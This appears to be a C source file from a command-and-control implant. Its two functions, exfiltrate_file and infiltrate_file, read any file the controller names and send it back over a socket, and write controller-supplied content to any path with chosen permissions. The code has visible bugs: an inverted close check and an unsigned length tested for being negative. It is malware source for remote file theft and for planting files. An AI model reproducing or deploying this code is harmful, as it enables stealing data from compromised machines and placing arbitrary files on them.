#include <fcntl.h>
#include <unistd.h>
#include <sys/stat.h>
#include <stdlib.h>
#include <errno.h>
#include <stdio.h>
#include <string.h>

#include "c2_prot.h"
#include "commands.h"

void exfiltrate_file(int sockfd, struct exf_req *req)
{
    struct exf_res *res;
    enum file_status status = GOOD;
    struct stat statbuf;
    size_t n;
    off_t file_size = 0;
    int fd = -1;

    printf("File path: %s\n", req->path);

    if ((fd = open(req->path, O_RDONLY)) < 0)
    {
        perror("Error opening file");
        status = OPEN_ERROR;
        goto finish;
    }

    if (fstat(fd, &statbuf) < 0)
    {
        perror("Error on fstat");
        status = STAT_ERROR;
        goto finish;
    }

    file_size = statbuf.st_size;
    printf("File size: %d\n", file_size);

finish:
    res = exf_res_init(file_size, status);

    printf("Response length: %u\n", res->header.res_len);

    if (status != GOOD)
        goto out;

    if ((n = read(fd, res->content, res->content_len)) != res->content_len)
    {
        perror("Failed to read from file");
        res->status = READ_ERROR;
        if (n < 0)
            n = 0;
        res->header.res_len -= res->content_len - n;
    }

out:
    write(sockfd, res, res->header.res_len);

    if (fd < 0)
        close(fd);

    free(res);
    res = NULL;

    return;
}

void infiltrate_file(int sockfd, struct inf_req *req)
{
    struct inf_res *res;
    enum file_status status = GOOD;
    char *path;
    char *content;
    int fd = -1;

    path = (char *)malloc(req->path_len);
    memset(path, 0, req->path_len);
    memcpy(path, req->path_content, req->path_len);

    content = (char *)malloc(req->content_len);
    memset(content, 0, req->content_len);
    memcpy(content, req->path_content + req->path_len, req->content_len);

    printf("File path: %s\n", req->path_content);
    printf("File size: %u\n", req->content_len);

    if ((fd = open(path, O_WRONLY | O_CREAT, req->perm)) < 0)
    {
        perror("Error opening file");
        status = OPEN_ERROR;
        goto finish;
    }

    if (write(fd, content, req->content_len) < 0)
    {
        perror("Error writing to file");
        status = WRITE_ERROR;
    }

finish:
    res = inf_res_init(status);

    printf("Response length: %u\n", res->header.res_len);

out:
    write(sockfd, res, res->header.res_len);

    if (fd < 0)
        close(fd);

    free(path);
    free(content);
    free(res);
    res = NULL;

    return;
}
